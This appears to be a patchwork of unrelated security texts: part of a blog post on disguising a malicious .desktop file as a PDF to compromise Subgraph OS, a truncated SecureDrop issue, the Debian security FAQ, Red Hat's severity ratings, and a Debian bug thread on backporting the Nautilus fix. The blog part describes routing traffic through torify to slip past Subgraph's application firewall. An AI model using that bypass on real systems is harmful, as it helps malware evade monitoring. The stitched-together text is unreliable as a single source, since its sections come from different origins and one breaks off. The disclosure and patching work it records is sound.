The Subgraph Firewall is pretty cool. It’s an application firewall that lets you approve or deny network connections on a process-by-process basis. As I showed in the video, when you open the GNOME Calculator app, it tries making network connections (to look up currency conversation rates), and but the firewall intercepts these and lets you deny them.

However, it’s trivial to bypass because it allows all Tor traffic through, no questions asked. For example, if you open a terminal and run `curl example.com`, the firewall intercepts this connection and gives you the option to deny it:

![](sgos_firewall1.png)

But if you run `torify curl example.com`, it just works. If you check the payload above, you’ll see that all of the internet requests I made use torify to bypass the firewall.

When I pointed this out to the Subgraph devs, they told me that the Subgraph Firewall wasn’t designed to prevent malware from making network connections, but rather just to prevent incidental privacy leaks (such as with the calculator). So they didn’t consider this a valid security issue.

When they show off the Subgraph Firewall on their website, they neglected to explain this limitation:

![](subgraph_firewall.png)

However, they do mention it in the Subgraph OS Handbook, but with questionable use of the word “sophisticated”:

> Application firewalls are useful for monitoring unexpected connections from applications. For example, some applications may phone home to the vendor’s website. Often this activity is legitimate (non-malicious) but it still may violate the user’s privacy or expectations of how the software operates. Subgraph Firewall gives users the choice to allow or deny these connections.
>
> Malicious code may also phone home to a website or server that is operated by the hacker or malicious code author. Subgraph Firewall can also alert the user of these connections so that they can be denied.
>
> Application firewalls cannot prevent all malicious code from connecting to the Internet. **Sophisticated malicious code can subvert the allowed connections to bypass the firewall.** However, the firewall may alert the user of connection attempts by less sophisticated malicious code

They did say that they will probably expand the scope and purpose of the firewall in the future — and they pointed to an [incomplete branch](https://github.com/subgraph/fw-daemon/tree/socks-filter) of their firewall code that would allow intercepting Tor traffic to let the user deny it, some day when it’s done.

**How this attack would affect Qubes**

Qubes is flexible, so how much the attack succeeds depends on the user’s choices.

In the worst case, the exploit would hack the sandbox (which is called an AppVM, in Qubes lingo) that the user opens it in. This could be their “personal” AppVM full of private data, or a “browser” AppVM that has nothing but a web browser profile, or it could be a [Whonix](https://www.whonix.org/) AppVM, where all internet traffic is forced to go over Tor. In any of these cases, the attacker will be stuck in a sandbox and won’t be able to compromise other AppVMs. The attacker also won’t be able to query the hardware — they won’t be able to learn the network interface’s MAC address, or see nearby wifi access points or bluetooth devices, or anything like that. They won’t be able to access the microphone or webcam.

However, some Qubes users are more careful than that. If the user right-clicks on the fake PDF .desktop and chooses “Open in DisposableVM”, the hack will fail. DisposableVMs are basically one-time-use sandboxes that work like this: a new sandbox gets created, the file gets copied into it (in this case, the malicious PDF .desktop file), the file gets opened, and when it’s done running, the entire sandbox is deleted. I just tested this out — for me, sgos\_handbook.pdf.desktop actually just opens in Atom, a text editor I have installed.

![](subgraph_dispvm.png)

Even if the payload executes — like, for example, if this were actually a malicious PDF that exploits Evince instead of a `.desktop` file, it wouldn’t have access to any user data. If the DisposableVM has internet access (which depends on the user’s settings), the payload might be able to phone home, but it won’t be able to tell the attacker anything besides “I’m stuck in a DisposableVM.” It certainly couldn’t take a snapshot from my webcam, record from my mic, or install any sort of persistent malware. And as soon the program closes, the whole sandbox gets deleted.

**Final thoughts**

Much of the Qubes vs. Subgraph OS debate has focused on the relative security of the two different types of sandboxing: the Xen hypervisor vs. grsecurity/Linux containers. Which is “more secure” is complicated and subjective.

But what gets lost in the debate is the most important difference between the operating systems: Qubes provides **security by compartmentalization**, while Subgraph OS provides **OS hardening and app sandboxes**. As this exploit hopefully demonstrates, these are *not the same thing*.

It’s exciting to see an attempt at a security-hardened Linux distro, but it’s no substitute for the compartmentalization that’s made possible by Qubes.

***Update April 12, 2017***

Subgraph [pointed out a typo](https://twitter.com/subgraph/status/851843464115441664) in this blog post and [stated](https://twitter.com/subgraph/status/851846268984987648) that this attack is possible because of an outstanding vulnerability in Nautilus. One Subgraph developer [claimed](https://twitter.com/bleidl/status/851849723002703873) that this isn’t a bug in Subgraph OS, [said](https://twitter.com/bleidl/status/851851948710141952) that Qubes was just as vulnerable (it’s [not](https://twitter.com/isislovecruft/status/851890009057710080)), and [said](https://twitter.com/bleidl/status/851852258761465860), “Do I have to make a video too?” (please do!).

But then last night, Subgraph [fixed](https://twitter.com/subgraph/status/852000407253594114) this not-a-bug in Subgraph OS! Users can upgrade to it.

![](Screenshot_2017-04-12_12-29-49.png)

I tested it out, and it works great (I can’t wait until this patch hits Debian and Fedora, too). I made this little animated GIF to show what `sgos_handbook.pdf.desktop` now looks like in Nautilus. When it’s executable it still displays it as a `.desktop` file, when you open it it displays a warning, and only if you click through the warning does it make it appear like a PDF:

![](nautilus.gif)

This is excellent and fixes this specific issue, but it doesn’t fix the more fundamental problem that Subgraph OS has in trying to be an “adversary resistant OS”: Most software still doesn’t run inside of a sandbox. A future bug in Nautilus or other unsandboxed app (or tricking the target into installing a malicious `pip` package you control, etc.) will still allow the attacker to take over the computer.

## Description

[![@garrettr](https://avatars.githubusercontent.com/u/407302?v=4&size=48)](/garrettr)[garrettr](https://github.com/garrettr)opened [on Sep 1, 2017](https://github.com/freedomofpress/securedrop/issues/2238#issue-254505713)

Kevin Poulsen just [tweeted](https://twitter.com/kpoulsen/status/903412661404053506) a snippet of code that he says he received on his SecureDrop. The code snippet is incomplete, but it appears to be an attempt to exfiltrate sensitive data from the airgapped Secure Viewing Station (SVS).

Normally we would prefer to discuss potential security issues privately, in order to develop and deploy a fix without encouraging potential exploitation in case this really is a security vulnerability. In this case, the cat's out of the bag thanks the issue being reported publicly on Twitter, so we feel it's best to discuss it on an open forum in the interest of transparency.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

Subject: .desktop files can hide malware in Nautilus
Date: Thu, 13 Apr 2017 12:20:35 -0700
```
Package: nautilus
Version: 3.22.3-1

There is a bug in Nautilus that makes it possible to disguise a
malicious script as an innocent document, like a PDF or ODT, that gets
executed when the user opens it.

The upstream nautilus issue [1] has already been resolved, and will be
released in nautilus 3.24. But since this is an important security
issue, I think this patch should be backported so that it's fixed in
older versions of Debian.

See this blog post [2] for more about how this bug allows attackers to
compromise the security-focused Debian-based distro Subgraph.

Thanks for raising this issue in Debian!

Is there any plan upstream to backport this fix to their 3.22.x
branch, and/or to request a CVE?

Did you personally check whether it's straightforward to backport the
fix to 3.22?

Cheers,

Hi,

Seeing this bug. I have backported from the upstream patch (hash issue with
upstream diff) for testing purposes and all looks good. If anyone wishes to
test, a debdiff is attached.

The debdiff is prepared with a 'stretch-pu' in mind.

If any edits are required, please do not hesitate to let me know.

Regards

Phil

Hi,

Thank you Phil for providing a backport patch. What is the next step
needed to get this fix released as a backport? The .desktop security
issue is widely know and can be exploited in the wild [1]. IMO this
fixed should be made available as soon as possible.

Regards,
Donncha

IMO the next step is to find out the answer to "Is there any plan
upstream to backport this fix to their 3.22.x branch, and/or to
request a CVE?": if this problem is as severe as it sounds, then it
should be tracked as a security issue and fixed cross-distro, rather
than patched in only the distros that are lucky enough to have users
who care about such things.

The upstream developer has indicated that he willing to make a 3.22.x
release if a backport patch is provided. I've sent him a link to Phil
Wyett's debdiff which I hope is acceptable.

I will also file a CVE request for this issue which should help to
coordinate the release of this fix for other distros.

The upstream developer has now indicated that they will not be
backporting the fix to 3.22.x. They have a policy of not backporting
fixes which involve UI changes in stable branches.

Will Debian backport this issue themselves? I have requested a CVE which
I hope will help other distros to coordinate their fixes.

Is there anything that I can do to help get this backport patch
deployed? This issue can be exploited in the wild and I think it should
be fixed as soon as possible.

I am still waiting for a response for my CVE request.

It's not just a UI change but a translatable string change. The new
dialog that users will have to use to mark .desktop's as trusted will
be untranslated.

Therefore, if you want this feature, you will need to use Nautilus >=
3.24 which means you will need to upgrade to buster.

Thanks,

I understand backporting is more difficult when there are user facing UI
and localisation changes. AFAIK the only new translatable string in the
patch is "Trust and _Launch". Would it be possible to include the
translations for that string with this backport patch?

Personally I don't consider this change a *feature*, it is a fix for a
serious security issue affecting Debian stable users (and Tails). The
issue is trivially exploitable against the default configuration.

Hi,

Please note that the debdiff I provided was essentially a raw backport for
testing and I thought it may have issues. It was never meant as a 'here it is,
all done' patch ready for submission as a stable update.

I am a little busy at the moment, but if I can help here, I will.

Regards

Phil

Hi,

Has anyone looked at how Red Hat are approaching this issue? RHEL 7.4 is gnome
3.22 and using nautilus 3.22.3 I believe.

The corresponding Red Hat bug is at
<https://bugzilla.redhat.com/show_bug.cgi?id=1442231>. Unfortunately there
has not been any progress with fixing this issue in RHEL or Fedora 25
either.

Thanks for creating the original patch. I'm not experienced with Debian
packing, but I will try to test your patch later today.

Hi,

Being that this is tagged against Fedora 27 in Red Hats bugzilla. I have cloned
the bug and assigned it to RHEL 7.4.

<https://bugzilla.redhat.com/show_bug.cgi?id=1491425>

Hi,

I have cherry-picked the translations for the string "Trust and _Launch"
and created an updated patch and debdiff containing those strings in the
respective .po files.

Unfortunately it looks like the Debian package does not rebuild the
.gmo/.mo files from the .po files during the build. Instead it uses the
pre-built .gmo files which have be include in the upstream release. As a
result the added translation are not included with the built package.

I'm not sure what is the best way to resolve this:

1. Add gettext build dependency and rebuild the .mo files
3. Ask upstream maintainer to make a 3.22 release contain the patch and
translation
3. Create release without translation for that one string

Phil, I have tested your patch on Tail 3.1 (based on Debian Jessie) and
it is functioning as expected.

